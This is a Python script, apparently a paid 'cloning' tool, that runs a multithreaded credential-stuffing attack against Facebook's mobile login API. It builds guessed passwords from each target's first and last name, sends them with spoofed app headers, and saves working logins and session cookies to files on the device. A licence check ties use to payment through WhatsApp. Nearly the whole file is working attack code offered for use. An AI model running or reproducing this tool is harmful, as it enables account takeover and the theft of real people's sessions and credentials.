# Coded BY Kamran Haider
import os
try:
    import requests
except ModuleNotFoundError:
    os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests bs4')
import random,time,sys,requests,uuid,json,base64,re,zlib,shutil,platform,subprocess,tempfile,string
from concurrent.futures import ThreadPoolExecutor as loda
from bs4 import BeautifulSoup

oks = []
cps = []
plist = []
methods = []
speed = []
twf = []
loop = 0
os.system('https://chat.whatsapp.com/HXqyQgfFnrBBNflwqcW1nj')

logo = """
 ██   ██ ██    ██ ███████ 
 ██ ██   ██  ██     ███  
  ███     ████     ███   
 ██ ██     ██     ███    
██   ██    ██    ███████ 
                                               
---------------------------
Onwer.      [*] MUDASSAR ALI
Facebook.   [*] MUDASSAR ALI
Version.    [*] 0.9
Tool        [*]  PAID
---------------------------"""
def approval():

  os.system('clear')

  print(logo)

  uuid = str(os.geteuid()) + str(os.getlogin())

  id = "-".join(uuid)

  try:

    httpCaht = requests.get('https://github.com/Mudassarch1122/Approval/blob/main/Token.txt').text

    if id in httpCaht:

      print("\33[1;32m \033[1;92m 》\033[1;97mYour Token is Successfully Approved")

      msg = str(os.geteuid())

      time.sleep(0.5)

      menu()
      pass

    else:

      print(" \033[1;92m 》\033[1;97mYour Token : "+id)

      print('\33[1;32m--------------------------------------------------')

      print("\33[1;32m\033[1;92m  》\033[1;97mKSI BI SORAT ME PAISE WAPIS NHI HO GE")

      print("\33[1;32m--------------------------------------------------")

      print("\33[1;32m\033[1;92m  》\033[1;97mPAKISTAN'S 15 DAYS       \033[1;92m 》 \033[1;97mPRICE 250 PKR")
      
      print("\33[1;32m\033[1;92m  》\033[1;97mPAKISTAN'S MONTHLY       \033[1;92m 》 \033[1;97mPRICE 400 PKR")
      
      print('\33[1;32m--------------------------------------------------')
      
      print("\33[1;32m\033[1;92m  》\033[1;97mOTHER COUNTRY 15 DAYS    \033[1;92m 》 \033[1;97mPRICE 3 DOLLAR")
      
      print("\33[1;32m\033[1;92m  》\033[1;97mOTHER COUNTRY MONTHLY     \033[1;92m》 \033[1;97mPRICE 5 DOLLAR")

      print('\33[1;32m--------------------------------------------------')
      input(' \033[1;92m 》\033[1;97mPRESS ENTER FOR SEND KEY TO ADMIN ')

      tks = ('Hello%20MUDASSAR%20BHAI%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+923231774792?text='+tks),approval()

      time.sleep(1)

      approval()

  except:

    sys.exit()

def linex():
    print('\033[1;37m---------------------------')

def clear():
        os.system('clear')
        print(logo)

def menu():
    os.system('clear')
    print(logo)
    print('[1] File Cloning')
    print('[2] Join Whatsapp Group')
    linex()
    lomda = input('\033[1;37mChoose Option : ')
    if lomda in ['1']:
        clear()
        print('PUT FILE EXAMPLE :  /sdcard/filename.txt')
        linex()
        file = input('Enter File Name\033[1;37m: ')
        try:
            fo = open(file,'r').read().splitlines()
        except FileNotFoundError:
            print('FILE NOT FOUND ')
            time.sleep(2)
            menu()
        clear()
        print('[1] METHOD 1')
        print('[2] METHOD 2')
        print('[3] METHOD 3')
        linex()
        mthd=input('CHOOSE : ')
        linex()
        clear()
        plist = []
        try:
            ps_limit = int(input('HOW MANY PASSWORDS DO YOU WANT ? '))
        except:
            ps_limit =1
        linex()
        clear()
        print('\033[1;37m EXAMPLE : first last,firtslast')
        linex()
        for i in range(ps_limit):
            plist.append(input(f'PUT PASSWORD {i+1}: '))
        linex()
        clear()
        with loda(max_workers=30) as crack_submit:
            clear()
            total_ids = str(len(fo))
            print(' TOTAL ACCOUNT : \033[1;32m'+total_ids+f' ')
            print("\033[1;37m CRACKING STARTED...\033[1;37m")
            linex()
            for user in fo:
                ids,names = user.split('|')
                passlist = plist
                if mthd in ['1','01']:
                    crack_submit.submit(ffb,ids,names,passlist)
                elif mthd in ['2','02']:
                    pass
                elif mthd in ['3','03']:
                    pass
        print('\033[1;37m')
        linex()
        print(' THE PROCESS HAS COMPLETED')
        print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
        linex()
        input(' PRESS ENTER TO BACK ')
        os.system('python YSB.py')
    elif lomda in ['2']:
            os.system('https://chat.whatsapp.com/HXqyQgfFnrBBNflwqcW1nj')
    else:
        menu()

def ffb(ids,names,passlist):
        try:
                global oks,loop
                sys.stdout.write('\r\r\033[1;37m [XYZ] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        ua = "[FBAN/FB4A;FBAV/"+str(random.randint(11,99))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,99))+";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/FB4A;FBAV/175.0.0.40.97;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/111983758;FBCR/Viettel Telecom;FBMF/samsung;FBBD/samsung;FBDV/SM-G925F;FBSV/5.1.1;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=1280,height=720};FB_FW/1;]"
                        head = {'User-Agent': ua,
                                'Accept-Encoding': 'gzip, deflate',
                                'Connection': 'Keep-Alive',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'Host': 'graph.facebook.com',
                                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                'X-FB-Connection-Type': 'MOBILE.LTE',
                                'X-Tigon-Is-Retry': 'False',
                                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
                                'x-fb-device-group': '5120',
                                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                                'X-FB-Request-Analytics-Tags': 'graphservice',
                                'X-FB-HTTP-Engine': 'Liger',
                                'X-FB-Client-IP': 'True',
                                'X-FB-Server-Cluster': 'True',
                                'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
                        data = {'adid':str(uuid.uuid4()),
                                'format':'json',
                                'device_id':str(uuid.uuid4()),
                                'email':ids,'password':pas,
                                'generate_analytics_claims':'1',
                                'community_id':'',
                                'cpl':'true',
                                'try_num':'1',
                                'family_device_id':str(uuid.uuid4()),
                                'credentials_type':'password',
                                'source':'login',
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'currently_logged_in_userid':'0',
                                'locale': 'en_SV','client_country_code': 'SV',
                                'fb_api_req_friendly_name':'authenticate',
                                'api_key':'62f8ce9f74b12f84c123cc23437a4a32',
                                'access_token':accees_token}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=head).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [XYZ-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        open('/sdcard/XYZ-COOKIE.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                                        open('/sdcard/XYZ-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                                print('\r\r \033[1;34m[XYZ-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                                print('\r\r\x1b[1;31m [XYZ-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/XYZ-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                        else:
                                        continue
                loop+=1
        except Exception as e:
                time.sleep(20)
approval()